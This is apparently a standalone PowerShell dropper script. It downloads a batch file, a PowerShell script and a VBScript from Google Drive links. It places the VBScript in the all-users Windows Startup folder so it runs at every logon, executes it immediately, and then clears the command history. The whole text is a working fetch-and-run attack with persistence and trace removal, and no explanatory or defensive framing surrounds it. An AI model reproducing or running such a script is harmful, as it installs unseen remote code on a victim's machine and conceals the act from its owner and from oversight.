cd C:\Users\$Env:UserName
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1vM2sB8h3zyI9IbU4f3tPPpG142NTWC2e" -outfile "win64.bat"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1TQtqLuMPxJ07uYXVQUxX0lUrUCMwG7rG" -outfile "user.ps1"
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1YNYvEt-n46Oj7_lfCJzuHzeDr6b-d1o2" -outfile "startup.vbs"
start startup.vbs
Clear-History
exit
